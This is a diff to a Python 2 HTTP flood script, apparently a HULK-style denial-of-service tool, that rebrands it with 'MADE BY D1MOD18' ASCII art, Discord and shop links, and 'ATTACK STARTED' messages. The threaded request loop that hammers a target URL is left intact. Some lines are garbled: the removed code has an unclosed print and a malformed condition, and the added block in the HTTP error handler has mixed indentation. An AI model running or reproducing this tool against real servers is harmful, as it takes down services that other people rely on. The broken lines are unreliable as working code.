@@ -1,5 +1,4 @@
 import os
-import time
 import urllib2
 import sys
 import threading
@@ -61,10 +60,25 @@ def buildblock(size):
 		out_str += chr(a)
 	return(out_str)
 
-os.system("clear")
-print("""
-print("\033[33m®®®®®®®®®®®®®®®®®
-""")
+def usage():
+	print '.=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-.'
+	print '|                     ______                     |'
+	print '|                  .-"      "-.                  |'
+	print '|                 /            \                 |'
+	print '|     _          |              |          _     |'
+	print '|    ( \         |,  .-.  .-.  ,|         / )    |'
+	print '|     > "=._     | )(__/  \__)( |     _.=" <     |'
+	print '|    (_/"=._"=._ |/     /\     \| _.="_.="\_)    |'
+	print '|           "=._"(_     ^^     _)"_.="           |'
+	print '|               "=\__|IIIIII|__/="               |'
+	print '|              _.="| \IIIIII/ |"=._              |'
+	print '|    _     _.="_.="\          /"=._"=._     _    |'
+	print '|   ( \_.="_.="     `--------`     "=._"=._/ )   |'
+	print '|    > _.="                            "=._ <    |'
+	print '|   (_/           MADE BY D1MOD18          \_)   |'
+	print '|           https://discord.gg/hn7epsef4Z        |'
+	print '|               https://d1modshop.ml             |'
+	print  '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-='
 
 #http request
 def httpcall(url):
@@ -85,12 +99,30 @@ def httpcall(url):
 	request.add_header('Host',host)
 	try:
 			urllib2.urlopen(request)
-	except (urllib2.HTTPError, e):
+	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
+			print '.=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-.'
+			print '|                ATTACKED STARTED                |'
+	                print '|                     ______                     |'
+	                print '|                  .-"      "-.                  |'
+	                print '|                 /            \                 |'
+	                print '|     _          |              |          _     |'
+	                print '|    ( \         |,  .-.  .-.  ,|         / )    |'
+	                print '|     > "=._     | )(__/  \__)( |     _.=" <     |'
+	                print '|    (_/"=._"=._ |/     /\     \| _.="_.="\_)    |'
+	                print '|           "=._"(_     ^^     _)"_.="           |'
+	                print '|               "=\__|IIIIII|__/="               |'
+	                print '|              _.="| \IIIIII/ |"=._              |'
+	                print '|    _     _.="_.="\          /"=._"=._     _    |'
+	                print '|   ( \_.="_.="     `--------`     "=._"=._/ )   |'
+	                print '|    > _.="                            "=._ <    |'
+	                print '|   (_/           MADE BY D1MOD18          \_)   |'
+	                print '|           https://discord.gg/hn7epsef4Z        |'
+	                print '|               https://d1modshop.ml             |'
+	                print  '-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-='
 			code=500
-	except (urllib2.URLError, e):
+	except urllib2.URLError, e:
 			#print e.reason
 			sys.exit()
 	else:
@@ -107,18 +139,18 @@ class HTTPThread(threading.Thread):
 				code=httpcall(url)
 				if (code==500) & (safe==1):
 					set_flag(2)
-		except (Exception, ex):
+		except Exception, ex:
 			pass
 
 class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if  previous+500<request_counter & (previous.request_counter):
-				print("\033[97m%d  ATTACK THE SERVER --> %" (request_counter)
+			if (previous+500<request_counter) & (previous<>request_counter):
+				print "%d D1MOD ATTACKED THE SERVER -->" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print("\n-- Attack Finished --")
+			print "\n-- D1MOD Attack Finished --"
 
 
 if len(sys.argv) < 2:
@@ -129,7 +161,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print("_<--  ATTACK STARTED --->")
+		print "_<-- D1MOD ATTACK STARTED --->"
 			if sys.argv[2]=="safe":
 				set_safe()
 		url = sys.argv[1]
